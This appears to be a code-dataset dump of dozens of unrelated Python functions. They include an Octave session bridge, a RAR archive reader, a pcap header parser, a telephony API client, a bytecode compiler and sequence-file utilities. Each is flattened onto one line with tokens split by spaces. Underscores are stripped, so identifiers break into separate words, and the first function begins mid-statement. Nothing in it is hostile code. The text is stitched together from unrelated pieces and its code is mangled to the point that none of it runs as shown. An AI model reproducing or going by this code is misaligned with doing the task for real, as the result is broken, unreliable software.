quot >= len ( thisrowcolumns ) : continue columns = thisrowcolumns [ quot ] if len ( words ) > len ( columns ) : continue for i in range ( len ( words ) ) : if self . options and columns [ i ] not in self . options : continue column = columns [ i ] # Converting -- to 0, seen this for buf pool hit rate if words [ i ] == "--" : words [ i ] = "0" ts = naarad . utils . reconcile timezones ( ts , self . timezone , self . graph timezone ) # Calculating check point age if self . metric type == "INNOTOP-I" : if column == "log seq no" : log seq no = int ( words [ i ] ) elif column == "log flushed to" : check pt age = log seq no - int ( words [ i ] ) tup = [ ts , str ( check pt age ) ] data [ "check pt age" ] . append ( tup ) tup = [ ts , words [ i ] ] data [ column ] . append ( tup ) # Post Proc, writing the different out files for column in data : csvfile = self . get csv ( column ) self . csv files . append ( csvfile ) with open ( csvfile , 'w' ) as outfh : for tup in data [ column ] : outfh . write ( ',' . join ( tup ) ) outfh . write ( '\n' ) return True
def set scores ( self ) : anom scores = { } self . compute derivatives ( ) derivatives ema = utils . compute ema ( self . smoothing factor , self . derivatives ) for i , ( timestamp , value ) in enumerate ( self . time series items ) : anom scores [ timestamp ] = abs ( self . derivatives [ i ] - derivatives ema [ i ] ) stdev = numpy . std ( anom scores . values ( ) ) if stdev : for timestamp in anom scores . keys ( ) : anom scores [ timestamp ] /= stdev self . anom scores = Time Series ( self . denoise scores ( anom scores ) )
def exit ( self ) : if self . engine : self . engine . repl . terminate ( ) self . engine = None
def restart ( self ) : if self . engine : self . engine . repl . terminate ( ) executable = self . executable if executable : os . environ [ 'OCTAVE EXECUTABLE' ] = executable if 'OCTAVE EXECUTABLE' not in os . environ and 'OCTAVE' in os . environ : os . environ [ 'OCTAVE EXECUTABLE' ] = os . environ [ 'OCTAVE' ] self . engine = Octave Engine ( stdin handler = self . handle stdin , logger = self . logger ) self . engine . eval ( 'addpath("%s");' % HERE . replace ( osp . sep , '/' ) )
def feval ( self , func name , func args = ( ) , dname = '' , nout = 0 , timeout = None , stream handler = None , store as = '' , plot dir = None ) : engine = self . engine if engine is None : raise Oct2Py Error ( 'Session is closed' ) out file = osp . join ( self . temp dir , 'writer.mat' ) out file = out file . replace ( osp . sep , '/' ) in file = osp . join ( self . temp dir , 'reader.mat' ) in file = in file . replace ( osp . sep , '/' ) func args = list ( func args ) ref indices = [ ] for ( i , value ) in enumerate ( func args ) : if isinstance ( value , Octave Ptr ) : ref indices . append ( i + 1 ) func args [ i ] = value . address ref indices = np . array ( ref indices ) req = dict ( func name = func name , func args = tuple ( func args ) , dname = dname or '' , nout = nout , store as = store as or '' , ref indices = ref indices ) write file ( req , out file , oned as = self . oned as , convert to float = self . convert to float ) engine . stream handler = stream handler or self . logger . info if timeout is None : timeout = self . timeout try : engine . eval ( ' pyeval("%s", "%s");' % ( out file , in file ) , timeout = timeout ) except Keyboard Interrupt as e : stream handler ( engine . repl . interrupt ( ) ) raise except TIMEOUT : stream handler ( engine . repl . interrupt ( ) ) raise Oct2Py Error ( 'Timed out, interrupting' ) except EOF : stream handler ( engine . repl . child . before ) self . restart ( ) raise Oct2Py Error ( 'Session died, restarting' ) resp = read file ( in file , self ) if resp [ 'err' ] : msg = self . parse error ( resp [ 'err' ] ) raise Oct2Py Error ( msg ) result = resp [ 'result' ] . ravel ( ) . tolist ( ) if isinstance ( result , list ) and len ( result ) == 1 : result = result [ 0 ] if ( isinstance ( result , Cell ) and result . size == 1 and isinstance ( result [ 0 ] , string types ) and result [ 0 ] == ' no value ' ) : result = None if plot dir : self . engine . make figures ( plot dir ) return result
def parse error ( self , err ) : self . logger . debug ( err ) stack = err . get ( 'stack' , [ ] ) if not err [ 'message' ] . startswith ( 'parse error:' ) : err [ 'message' ] = 'error: ' + err [ 'message' ] errmsg = 'Octave evaluation error:\n%s' % err [ 'message' ] if not isinstance ( stack , Struct Array ) : return errmsg errmsg += '\nerror: called from:' for item in stack [ : - 1 ] : errmsg += '\n    %(name)s at line %(line)d' % item try : errmsg += ', column %(column)d' % item except Exception : pass return errmsg
def isobject ( self , name , exist ) : if exist in [ 2 , 5 ] : return False cmd = 'isobject(%s)' % name resp = self . engine . eval ( cmd , silent = True ) . strip ( ) return resp == 'ans =  1'
def get function ptr ( self , name ) : func = make function ptr instance self . function ptrs . setdefault ( name , func ( self , name ) ) return self . function ptrs [ name ]
def get user class ( self , name ) : self . user classes . setdefault ( name , make user class ( self , name ) ) return self . user classes [ name ]
def cleanup ( self ) : self . exit ( ) workspace = osp . join ( os . getcwd ( ) , 'octave-workspace' ) if osp . exists ( workspace ) : os . remove ( workspace )
def read file ( path , session = None ) : try : data = loadmat ( path , struct as record = True ) except Unicode Decode Error as e : raise Oct2Py Error ( str ( e ) ) out = dict ( ) for ( key , value ) in data . items ( ) : out [ key ] = extract ( value , session ) return out
def write file ( obj , path , oned as = 'row' , convert to float = True ) : data = encode ( obj , convert to float ) try : with WRITE LOCK : savemat ( path , data , appendmat = False , oned as = oned as , long field names = True ) except Key Error : raise Exception ( 'could not save mat file' )
def extract ( data , session = None ) : if isinstance ( data , list ) : return [ extract ( d , session ) for d in data ] if not isinstance ( data , np . ndarray ) : return data if isinstance ( data , Matlab Object ) : cls = session . get user class ( data . classname ) return cls . from value ( data ) if data . dtype . names : if data . size == 1 : return create struct ( data , session ) return Struct Array ( data , session ) if data . dtype . kind == 'O' : return Cell ( data , session ) if data . size == 1 : return data . item ( ) if data . size == 0 : if data . dtype . kind in 'US' : return '' return [ ] return data
def create struct ( data , session ) : out = Struct ( ) for name in data . dtype . names : item = data [ name ] if isinstance ( item , np . ndarray ) and item . dtype . kind == 'O' : item = item . squeeze ( ) . tolist ( ) out [ name ] = extract ( item , session ) return out
def encode ( data , convert to float ) : ctf = convert to float if isinstance ( data , ( Octave Variable Ptr ) ) : return encode ( data . value , ctf ) if isinstance ( data , Octave User Class ) : return encode ( Octave User Class . to value ( data ) , ctf ) if isinstance ( data , ( Octave Function Ptr , Matlab Function ) ) : raise Oct2Py Error ( 'Cannot write Octave functions' ) if isinstance ( data , Matlab Object ) : view = data . view ( np . ndarray ) out = Matlab Object ( data , data . classname ) for name in out . dtype . names : out [ name ] = encode ( view [ name ] , ctf ) return out if isinstance ( data , ( Data Frame , Series ) ) : return encode ( data . values , ctf ) if isinstance ( data , dict ) : out = dict ( ) for ( key , value ) in data . items ( ) : out [ key ] = encode ( value , ctf ) return out if data is None : return np . Na N if isinstance ( data , set ) : return encode ( list ( data ) , ctf ) if isinstance ( data , list ) : if is simple numeric ( data ) : return encode ( np . array ( data ) , ctf ) return encode ( tuple ( data ) , ctf ) if isinstance ( data , tuple ) : obj = np . empty ( len ( data ) , dtype = object ) for ( i , item ) in enumerate ( data ) : obj [ i ] = encode ( item , ctf ) return obj if isinstance ( data , spmatrix ) : return data . astype ( np . float64 ) if not isinstance ( data , np . ndarray ) : return data if data . dtype . kind in 'OV' : out = np . empty ( data . size , dtype = data . dtype ) for ( i , item ) in enumerate ( data . ravel ( ) ) : if data . dtype . names : for name in data . dtype . names : out [ i ] [ name ] = encode ( item [ name ] , ctf ) else : out [ i ] = encode ( item , ctf ) return out . reshape ( data . shape ) if data . dtype . name == 'complex256' : return data . astype ( np . complex128 ) if ctf and data . dtype . kind in 'ui' : return data . astype ( np . float64 ) return data
def is simple numeric ( data ) : for item in data : if isinstance ( item , set ) : item = list ( item ) if isinstance ( item , list ) : if not is simple numeric ( item ) : return False elif not isinstance ( item , ( int , float , complex ) ) : return False return True
def setup log ( ) : try : handler = logging . Stream Handler ( stream = sys . stdout ) except Type Error : handler = logging . Stream Handler ( strm = sys . stdout ) log = get log ( ) log . add Handler ( handler ) log . set Level ( logging . INFO ) log . propagate = False
def make user class ( session , name ) : attrs = session . eval ( 'fieldnames(%s);' % name , nout = 1 ) . ravel ( ) . tolist ( ) methods = session . eval ( 'methods(%s);' % name , nout = 1 ) . ravel ( ) . tolist ( ) ref = weakref . ref ( session ) doc = Doc Descriptor ( ref , name ) values = dict ( doc = doc , name = name , ref = ref , attrs = attrs , module = 'oct2py.dynamic' ) for method in methods : doc = Method Doc Descriptor ( ref , name , method ) cls name = '%s %s' % ( name , method ) method values = dict ( doc = doc ) method cls = type ( str ( cls name ) , ( Octave User Class Method , ) , method values ) values [ method ] = method cls ( ref , method , name ) for attr in attrs : values [ attr ] = Octave User Class Attr ( ref , attr , attr ) return type ( str ( name ) , ( Octave User Class , ) , values )
def to value ( cls , instance ) : if not isinstance ( instance , Octave User Class ) or not instance . attrs : return dict ( ) # Bootstrap a Matlab Object from scipy.io dtype = [ ] values = [ ] for attr in instance . attrs : dtype . append ( ( str ( attr ) , object ) ) values . append ( getattr ( instance , attr ) ) struct = np . array ( [ tuple ( values ) ] , dtype ) return Matlab Object ( struct , instance . name )
def to pointer ( cls , instance ) : return Octave Ptr ( instance . ref , instance . name , instance . address )
def document func view ( serializer class = None , response serializer class = None , filter backends = None , permission classes = None , authentication classes = None , doc format args = list ( ) , doc format kwargs = dict ( ) ) : def decorator ( func ) : if serializer class : func . cls . serializer class = func . view class . serializer class = serializer class if response serializer class : func . cls . response serializer class = func . view class . response serializer class = response serializer class if filter backends : func . cls . filter backends = func . view class . filter backends = filter backends if permission classes : func . cls . permission classes = func . view class . permission classes = permission classes if authentication classes : func . cls . authentication classes = func . view class . authentication classes = authentication classes if doc format args or doc format kwargs : func . cls . doc = func . view class . doc = getdoc ( func ) . format ( * doc format args , * * doc format kwargs ) return func return decorator
def format docstring ( * args , * * kwargs ) : def decorator ( func ) : func . doc = getdoc ( func ) . format ( * args , * * kwargs ) return func return decorator
def is rarfile ( filename ) : mode = constants . RAR OM LIST INCSPLIT archive = unrarlib . RAR Open Archive Data Ex ( filename , mode = mode ) try : handle = unrarlib . RAR Open Archive Ex ( ctypes . byref ( archive ) ) except unrarlib . Unrar Exception : return False unrarlib . RAR Close Archive ( handle ) return ( archive . Open Result == constants . SUCCESS )
def read header ( self , handle ) : header data = unrarlib . RAR Header Data Ex ( ) try : res = unrarlib . RAR Read Header Ex ( handle , ctypes . byref ( header data ) ) rarinfo = Rar Info ( header = header data ) except unrarlib . Archive End : return None except unrarlib . Missing Password : raise Runtime Error ( "Archive is encrypted, password required" ) except unrarlib . Bad Password : raise Runtime Error ( "Bad password for Archive" ) except unrarlib . Unrar Exception as e : raise Bad Rar File ( str ( e ) ) return rarinfo
def process current ( self , handle , op , dest path = None , dest name = None ) : unrarlib . RAR Process File W ( handle , op , dest path , dest name )
def load metadata ( self , handle ) : rarinfo = self . read header ( handle ) while rarinfo : self . filelist . append ( rarinfo ) self . Name To Info [ rarinfo . filename ] = rarinfo self . process current ( handle , constants . RAR SKIP ) rarinfo = self . read header ( handle )
def open ( self , archive ) : try : handle = unrarlib . RAR Open Archive Ex ( ctypes . byref ( archive ) ) except unrarlib . Unrar Exception : raise Bad Rar File ( "Invalid RAR file." ) return handle
def namelist ( self ) : names = [ ] for member in self . filelist : names . append ( member . filename ) return names
def getinfo ( self , name ) : rarinfo = self . Name To Info . get ( name ) if rarinfo is None : raise Key Error ( 'There is no item named %r in the archive' % name ) return rarinfo
def printdir ( self ) : print ( "%-46s %19s %12s" % ( "File Name" , "Modified    " , "Size" ) ) for rarinfo in self . filelist : date = "%d-%02d-%02d %02d:%02d:%02d" % rarinfo . date time [ : 6 ] print ( "%-46s %s %12d" % ( rarinfo . filename , date , rarinfo . file size ) )
def dostime to timetuple ( dostime ) : dostime = dostime >> 16 dostime = dostime & 0xffff day = dostime & 0x1f month = ( dostime >> 5 ) & 0xf year = 1980 + ( dostime >> 9 ) second = 2 * ( dostime & 0x1f ) minute = ( dostime >> 5 ) & 0x3f hour = dostime >> 11 return ( year , month , day , hour , minute , second )
def c func ( func , restype , argtypes , errcheck = None ) : func . restype = restype func . argtypes = argtypes if errcheck is not None : func . errcheck = errcheck return func
def load savefile header ( file h ) : try : raw savefile header = file h . read ( 24 ) except Unicode Decode Error : print ( "\n Make sure the input file is opened in read binary, 'rb'\n" ) raise Invalid Encoding ( "Could not read file; it might not be opened in binary mode." ) # in case the capture file is not the same endianness as ours, we have to # use the correct byte order for the file header if raw savefile header [ : 4 ] in [ struct . pack ( ">I" , MAGIC NUMBER ) , struct . pack ( ">I" , MAGIC NUMBER NS ) ] : byte order = b'big' unpacked = struct . unpack ( '>Ihh IIII' , raw savefile header ) elif raw savefile header [ : 4 ] in [ struct . pack ( "<I" , MAGIC NUMBER ) , struct . pack ( "<I" , MAGIC NUMBER NS ) ] : byte order = b'little' unpacked = struct . unpack ( '<Ihh IIII' , raw savefile header ) else : raise Unknown Magic Number ( "No supported Magic Number found" ) ( magic , major , minor , tz off , ts acc , snaplen , ll type ) = unpacked header = pcap header ( magic , major , minor , tz off , ts acc , snaplen , ll type , ctypes . c char p ( byte order ) , magic == MAGIC NUMBER NS ) if not validate header ( header ) : raise Invalid Header ( "Invalid Header" ) else : return header
def strip ip ( packet ) : if not isinstance ( packet , IP ) : packet = IP ( packet ) payload = packet . payload return payload
def strip ethernet ( packet ) : if not isinstance ( packet , Ethernet ) : packet = Ethernet ( packet ) payload = packet . payload return payload
def reload config ( self , call params ) : path = '/' + self . api version + '/Reload Config/' method = 'POST' return self . request ( path , method , call params )
def reload cache config ( self , call params ) : path = '/' + self . api version + '/Reload Cache Config/' method = 'POST' return self . request ( path , method , call params )
def transfer call ( self , call params ) : path = '/' + self . api version + '/Transfer Call/' method = 'POST' return self . request ( path , method , call params )
def hangup all calls ( self ) : path = '/' + self . api version + '/Hangup All Calls/' method = 'POST' return self . request ( path , method )
def hangup call ( self , call params ) : path = '/' + self . api version + '/Hangup Call/' method = 'POST' return self . request ( path , method , call params )
def schedule hangup ( self , call params ) : path = '/' + self . api version + '/Schedule Hangup/' method = 'POST' return self . request ( path , method , call params )
def cancel scheduled hangup ( self , call params ) : path = '/' + self . api version + '/Cancel Scheduled Hangup/' method = 'POST' return self . request ( path , method , call params )
def conference mute ( self , call params ) : path = '/' + self . api version + '/Conference Mute/' method = 'POST' return self . request ( path , method , call params )
def play ( self , call params ) : path = '/' + self . api version + '/Play/' method = 'POST' return self . request ( path , method , call params )
def play stop ( self , call params ) : path = '/' + self . api version + '/Play Stop/' method = 'POST' return self . request ( path , method , call params )
def schedule play ( self , call params ) : path = '/' + self . api version + '/Schedule Play/' method = 'POST' return self . request ( path , method , call params )
def cancel scheduled play ( self , call params ) : path = '/' + self . api version + '/Cancel Scheduled Play/' method = 'POST' return self . request ( path , method , call params )
def sound touch ( self , call params ) : path = '/' + self . api version + '/Sound Touch/' method = 'POST' return self . request ( path , method , call params )
def sound touch stop ( self , call params ) : path = '/' + self . api version + '/Sound Touch Stop/' method = 'POST' return self . request ( path , method , call params )
def send digits ( self , call params ) : path = '/' + self . api version + '/Send Digits/' method = 'POST' return self . request ( path , method , call params )
def conference unmute ( self , call params ) : path = '/' + self . api version + '/Conference Unmute/' method = 'POST' return self . request ( path , method , call params )
def conference kick ( self , call params ) : path = '/' + self . api version + '/Conference Kick/' method = 'POST' return self . request ( path , method , call params )
def conference hangup ( self , call params ) : path = '/' + self . api version + '/Conference Hangup/' method = 'POST' return self . request ( path , method , call params )
def conference deaf ( self , call params ) : path = '/' + self . api version + '/Conference Deaf/' method = 'POST' return self . request ( path , method , call params )
def conference undeaf ( self , call params ) : path = '/' + self . api version + '/Conference Undeaf/' method = 'POST' return self . request ( path , method , call params )
def conference record start ( self , call params ) : path = '/' + self . api version + '/Conference Record Start/' method = 'POST' return self . request ( path , method , call params )
def conference play ( self , call params ) : path = '/' + self . api version + '/Conference Play/' method = 'POST' return self . request ( path , method , call params )
def conference speak ( self , call params ) : path = '/' + self . api version + '/Conference Speak/' method = 'POST' return self . request ( path , method , call params )
def conference list ( self , call params ) : path = '/' + self . api version + '/Conference List/' method = 'POST' return self . request ( path , method , call params )
def conference list members ( self , call params ) : path = '/' + self . api version + '/Conference List Members/' method = 'POST' return self . request ( path , method , call params )
def xml ( self , root ) : element = root . create Element ( self . name ) # Add attributes keys = self . attrs . keys ( ) keys . sort ( ) for a in keys : element . set Attribute ( a , self . attrs [ a ] ) if self . body : text = root . create Text Node ( self . body ) element . append Child ( text ) for c in self . elements : element . append Child ( c . xml ( root ) ) return element
def add node ( self , label ) : try : n = self . nodes [ label ] except Key Error : n = Node ( ) n [ 'label' ] = label self . nodes [ label ] = n return n
def add edge ( self , n1 label , n2 label , directed = False ) : n1 = self . add node ( n1 label ) n2 = self . add node ( n2 label ) e = Edge ( n1 , n2 , directed ) self . edges . append ( e ) return e
def node ( self , node ) : if node == self . node1 : return self . node2 elif node == self . node2 : return self . node1 else : return None
def arg parser ( ) : description = "Converts a completezip to a litezip" parser = argparse . Argument Parser ( description = description ) verbose group = parser . add mutually exclusive group ( ) verbose group . add argument ( '-v' , '--verbose' , action = 'store true' , dest = 'verbose' , default = None , help = "increase verbosity" ) verbose group . add argument ( '-q' , '--quiet' , action = 'store false' , dest = 'verbose' , default = None , help = "print nothing to stdout or stderr" ) parser . add argument ( 'location' , help = "Location of the unpacked litezip" ) return parser
def to bytes ( self , previous : bytes ) : # First, validate the lengths. if len ( self . conditions ) != len ( self . body ) : raise exc . Compile Error ( "Conditions and body length mismatch!" ) bc = b"" prev len = len ( previous ) # Loop over the conditions and bodies for condition , body in zip ( self . conditions , self . body ) : # Generate the conditional data. cond bytecode = condition . to bytecode ( previous ) bc += cond bytecode # Complex calculation. First, generate the bytecode for all tokens in the body. Then # we calculate the len() of that. We create a POP JUMP IF FALSE operation that jumps # to the instructions after the body code + 3 for the pop call. This is done for all # chained IF calls, as if it was an elif call. Else calls are not possible to be # auto-generated, but it is possible to emulate them using an elif call that checks # for the opposite of the above IF. # Call the  compile func method from compiler to compile the body. body bc = compiler . compile bytecode ( body ) bdyl = len ( body bc ) # Add together the lengths. gen len = prev len + len ( cond bytecode ) + bdyl + 1 # Generate the POP JUMP IF FALSE instruction bc += generate simple call ( tokens . POP JUMP IF FALSE , gen len ) # Add the body bc bc += body bc # Update previous len prev len = len ( previous ) + len ( bc ) return bc
def to bytes 35 ( self , previous : bytes ) : # Calculations ahead. bc = b"" # Calculate the length of the iterator. it bc = util . generate bytecode from obb ( self . iterator , previous ) bc += it bc # Push a get iter on. bc += util . generate bytecode from obb ( tokens . GET ITER , b"" ) prev len = len ( previous ) + len ( bc ) # Calculate the bytecode for the body. body bc = b"" for op in self . body : # Add padding bytes to the bytecode to allow if blocks to work. padded bc = previous # Add padding for SETUP LOOP padded bc += b"\x00\x00\x00" padded bc += bc # Add padding for FOR ITER padded bc += b"\x00\x00\x00" # Add previous body padded bc += body bc body bc += util . generate bytecode from obb ( op , padded bc ) # Add a JUMP ABSOLUTE body bc += util . generate simple call ( tokens . JUMP ABSOLUTE , prev len + 3 ) # Add a POP TOP body bc += util . generate bytecode from obb ( tokens . POP BLOCK , b"" ) # Calculate the right lengths. # Add a FOR ITER, using len(body bc) body bc = util . generate simple call ( tokens . FOR ITER , len ( body bc ) - 1 ) + body bc # Add the SETUP LOOP call bc = util . generate simple call ( tokens . SETUP LOOP , prev len + len ( body bc ) - 6 ) + bc + body bc return bc
def to bytes 36 ( self , previous : bytes ) : # Calculations ahead. bc = b"" # Calculate the length of the iterator. it bc = util . generate bytecode from obb ( self . iterator , previous ) bc += it bc bc += util . ensure instruction ( tokens . GET ITER )
def validate content ( * objs ) : from . main import Collection , Module validator = { Collection : cnxml . validate collxml , Module : cnxml . validate cnxml , } [ type ( objs [ 0 ] ) ] return validator ( * [ obj . file for obj in objs ] )
def intersection ( l1 , l2 ) : if len ( l1 ) == 0 or len ( l2 ) == 0 : return [ ] out = [ ] l2 pos = 0 for l in l1 : while l2 pos < len ( l2 ) and l2 [ l2 pos ] . end < l . start : l2 pos += 1 if l2 pos == len ( l2 ) : break while l2 pos < len ( l2 ) and l . intersects ( l2 [ l2 pos ] ) : out . append ( l . intersection ( l2 [ l2 pos ] ) ) l2 pos += 1 l2 pos = max ( 0 , l2 pos - 1 ) return out
def distance to point ( self , p ) : if self . start <= p <= self . end : return 0 else : return min ( abs ( self . start - p ) , abs ( self . end - p ) )
def intersects ( self , i ) : return self . start <= i . end and i . start <= self . end
def contains ( self , i ) : return self . start <= i . start and i . end <= self . end
def union ( self , i ) : if self . intersects ( i ) or self . end + 1 == i . start or i . end + 1 == self . start : return Interval ( min ( self . start , i . start ) , max ( self . end , i . end ) ) else : return None
def union fill gap ( self , i ) : return Interval ( min ( self . start , i . start ) , max ( self . end , i . end ) )
def intersection ( self , i ) : if self . intersects ( i ) : return Interval ( max ( self . start , i . start ) , min ( self . end , i . end ) ) else : return None
def file reader ( fname , read quals = False ) : f = utils . open file read ( fname ) line = f . readline ( ) phylip regex = re . compile ( '^\s*[0-9]+\s+[0-9]+$' ) gbk regex = re . compile ( '^LOCUS\s+\S' ) if line . startswith ( '>' ) : seq = Fasta ( ) previous lines [ f ] = line elif line . startswith ( '##gff-version 3' ) : seq = Fasta ( ) # if a GFF file, need to skip past all the annotation # and get to the fasta sequences at the end of the file while not line . startswith ( '>' ) : line = f . readline ( ) if not line : utils . close ( f ) raise Error ( 'No sequences found in GFF file "' + fname + '"' ) seq = Fasta ( ) previous lines [ f ] = line elif line . startswith ( 'ID   ' ) and line [ 5 ] != ' ' : seq = Embl ( ) previous lines [ f ] = line elif gbk regex . search ( line ) : seq = Embl ( ) previous lines [ f ] = line elif line . startswith ( '@' ) : seq = Fastq ( ) previous lines [ f ] = line elif phylip regex . search ( line ) : # phylip format could be interleaved or not, need to look at next # couple of lines to figure that out. Don't expect these files to # be too huge, so just store all the sequences in memory number of seqs , bases per seq = line . strip ( ) . split ( ) number of seqs = int ( number of seqs ) bases per seq = int ( bases per seq ) got blank line = False first line = line seq lines = [ ] while 1 : line = f . readline ( ) if line == '' : break elif line == '\n' : got blank line = True else : seq lines . append ( line . rstrip ( ) ) utils . close ( f ) if len ( seq lines ) == 1 or len ( seq lines ) == number of seqs : sequential = True elif seq lines [ 0 ] [ 10 ] != ' ' and seq lines [ 1 ] [ 10 ] == ' ' : sequential = True else : sequential = False # if the 11th char of second sequence line is a space,  then the file is sequential, e.g.: # GAGCCCGGGC AATACAGGGT AT # as opposed to: # Salmo gair AAGCCTTGGC AGTGCAGGGT if sequential : current id = None current seq = '' for line in seq lines : if len ( current seq ) == bases per seq or len ( current seq ) == 0 : if current id is not None : yield Fasta ( current id , current seq . replace ( '-' , '' ) ) current seq = '' current id , new bases = line [ 0 : 10 ] . rstrip ( ) , line . rstrip ( ) [ 10 : ] else : new bases = line . rstrip ( ) current seq += new bases . replace ( ' ' , '' ) yield Fasta ( current id , current seq . replace ( '-' , '' ) ) else : # seaview files start all seqs at pos >=12. Other files start # their sequence at the start of the line if seq lines [ number of seqs + 1 ] [ 0 ] == ' ' : first gap pos = seq lines [ 0 ] . find ( ' ' ) end of gap = first gap pos while seq lines [ 0 ] [ end of gap ] == ' ' : end of gap += 1 first seq base = end of gap else : first seq base = 10 seqs = [ ] for i in range ( number of seqs ) : name , bases = seq lines [ i ] [ 0 : first seq base ] . rstrip ( ) , seq lines [ i ] [ first seq base : ] seqs . append ( Fasta ( name , bases ) ) for i in range ( number of seqs , len ( seq lines ) ) : seqs [ i % number of seqs ] . seq += seq lines [ i ] for fa in seqs : fa . seq = fa . seq . replace ( ' ' , '' ) . replace ( '-' , '' ) yield fa return elif line == '' : utils . close ( f ) return else : utils . close ( f ) raise Error ( 'Error determining file type from file "' + fname + '". First line is:\n' + line . rstrip ( ) ) try : while seq . get next from file ( f , read quals ) : yield seq finally : utils . close ( f )
def subseq ( self , start , end ) : return Fasta ( self . id , self . seq [ start : end ] )
def expand nucleotides ( self ) : s = list ( self . seq ) for i in range ( len ( s ) ) : if s [ i ] in redundant nts : s [ i ] = '' . join ( redundant nts [ s [ i ] ] ) seqs = [ ] for x in itertools . product ( * s ) : seqs . append ( Fasta ( self . id + '.' + str ( len ( seqs ) + 1 ) , '' . join ( x ) ) ) return seqs
def replace bases ( self , old , new ) : self . seq = self . seq . replace ( old , new )
def replace interval ( self , start , end , new ) : if start > end or start > len ( self ) - 1 or end > len ( self ) - 1 : raise Error ( 'Error replacing bases ' + str ( start ) + '-' + str ( end ) + ' in sequence ' + self . id ) self . seq = self . seq [ 0 : start ] + new + self . seq [ end + 1 : ]
def gaps ( self , min length = 1 ) : gaps = [ ] regex = re . compile ( 'N+' , re . IGNORECASE ) for m in regex . finditer ( self . seq ) : if m . span ( ) [ 1 ] - m . span ( ) [ 0 ] + 1 >= min length : gaps . append ( intervals . Interval ( m . span ( ) [ 0 ] , m . span ( ) [ 1 ] - 1 ) ) return gaps
def to Fastq ( self , qual scores ) : if len ( self ) != len ( qual scores ) : raise Error ( 'Error making Fastq from Fasta, lengths differ.' , self . id ) return Fastq ( self . id , self . seq , '' . join ( [ chr ( max ( 0 , min ( x , 93 ) ) + 33 ) for x in qual scores ] ) )
def translate ( self , frame = 0 ) : return Fasta ( self . id , '' . join ( [ genetic codes . codes [ genetic code ] . get ( self . seq [ x : x + 3 ] . upper ( ) , 'X' ) for x in range ( frame , len ( self ) - 1 - frame , 3 ) ] ) )
def subseq ( self , start , end ) : return Fastq ( self . id , self . seq [ start : end ] , self . qual [ start : end ] )
def trim Ns ( self ) : # get index of first base that is not an N i = 0 while i < len ( self ) and self . seq [ i ] in 'n N' : i += 1 # strip off start of sequence and quality self . seq = self . seq [ i : ] self . qual = self . qual [ i : ] # strip the ends self . seq = self . seq . rstrip ( 'Nn' ) self . qual = self . qual [ : len ( self . seq ) ]
def replace interval ( self , start , end , new , qual string ) : if len ( new ) != len ( qual string ) : raise Error ( 'Length of new seq and qual string in replace interval() must be equal. Cannot continue' ) super ( ) . replace interval ( start , end , new ) self . qual = self . qual [ 0 : start ] + qual string + self . qual [ end + 1 : ]
def translate ( self ) : fa = super ( ) . translate ( ) return Fastq ( fa . id , fa . seq , 'I' * len ( fa . seq ) )
def count sequences ( infile ) : seq reader = sequences . file reader ( infile ) n = 0 for seq in seq reader : n += 1 return n
def make random contigs ( contigs , length , outfile , name by letters = False , prefix = '' , seed = None , first number = 1 ) : random . seed ( a = seed ) fout = utils . open file write ( outfile ) letters = list ( 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' ) letters index = 0 for i in range ( contigs ) : if name by letters : name = letters [ letters index ] letters index += 1 if letters index == len ( letters ) : letters index = 0 else : name = str ( i + first number ) fa = sequences . Fasta ( prefix + name , '' . join ( [ random . choice ( 'ACGT' ) for x in range ( length ) ] ) ) print ( fa , file = fout ) utils . close ( fout )
def mean length ( infile , limit = None ) : total = 0 count = 0 seq reader = sequences . file reader ( infile ) for seq in seq reader : total += len ( seq ) count += 1 if limit is not None and count >= limit : break assert count > 0 return total / count
def merge to one seq ( infile , outfile , seqname = 'union' ) : seq reader = sequences . file reader ( infile ) seqs = [ ] for seq in seq reader : seqs . append ( copy . copy ( seq ) ) new seq = '' . join ( [ seq . seq for seq in seqs ] ) if type ( seqs [ 0 ] ) == sequences . Fastq : new qual = '' . join ( [ seq . qual for seq in seqs ] ) seqs [ : ] = [ ] merged = sequences . Fastq ( seqname , new seq , new qual ) else : merged = sequences . Fasta ( seqname , new seq ) seqs [ : ] = [ ] f = utils . open file write ( outfile ) print ( merged , file = f ) utils . close ( f )
def sort by size ( infile , outfile , smallest first = False ) : seqs = { } file to dict ( infile , seqs ) seqs = list ( seqs . values ( ) ) seqs . sort ( key = lambda x : len ( x ) , reverse = not smallest first ) fout = utils . open file write ( outfile ) for seq in seqs : print ( seq , file = fout ) utils . close ( fout )
def sort by name ( infile , outfile ) : seqs = { } file to dict ( infile , seqs ) #seqs = list(seqs.values()) #seqs.sort() fout = utils . open file write ( outfile ) for name in sorted ( seqs ) : print ( seqs [ name ] , file = fout ) utils . close ( fout )
def to fastg ( infile , outfile , circular = None ) : if circular is None : to circularise = set ( ) elif type ( circular ) is not set : f = utils . open file read ( circular ) to circularise = set ( [ x . rstrip ( ) for x in f . readlines ( ) ] ) utils . close ( f ) else : to circularise = circular seq reader = sequences . file reader ( infile ) fout = utils . open file write ( outfile ) nodes = 1 for seq in seq reader : new id = ' ' . join ( [ 'NODE' , str ( nodes ) , 'length' , str ( len ( seq ) ) , 'cov' , '1' , 'ID' , seq . id ] ) if seq . id in to circularise : seq . id = new id + ':' + new id + ';' print ( seq , file = fout ) seq . revcomp ( ) seq . id = new id + "':" + new id + "';" print ( seq , file = fout ) else : seq . id = new id + ';' print ( seq , file = fout ) seq . revcomp ( ) seq . id = new id + "';" print ( seq , file = fout ) nodes += 1 utils . close ( fout )
def to boulderio ( infile , outfile ) : seq reader = sequences . file reader ( infile ) f out = utils . open file write ( outfile ) for sequence in seq reader : print ( "SEQUENCE ID=" + sequence . id , file = f out ) print ( "SEQUENCE TEMPLATE=" + sequence . seq , file = f out ) print ( "=" , file = f out ) utils . close ( f out )
def value to string ( self , obj ) : value = self . value from object ( obj ) return b64encode ( self . dump ( value ) ) . decode ( 'ascii' )
def get version ( version = None ) : version = get complete version ( version ) # Now build the two parts of the version number: # main = X.Y[.Z] # sub = .dev N - for pre-alpha releases #     | {a|b|c}N - for alpha, beta and rc releases main = get main version ( version ) sub = '' if version [ 3 ] == 'alpha' and version [ 4 ] == 0 : git changeset = get git changeset ( ) if git changeset : sub = '.dev%s' % git changeset elif version [ 3 ] != 'final' : mapping = { 'alpha' : 'a' , 'beta' : 'b' , 'rc' : 'c' } sub = mapping [ version [ 3 ] ] + str ( version [ 4 ] ) return str ( main + sub )
def init unique sets ( self ) : ks = dict ( ) for t in self . unique checks : key = t [ 0 ] ks [ key ] = set ( ) # empty set return ks
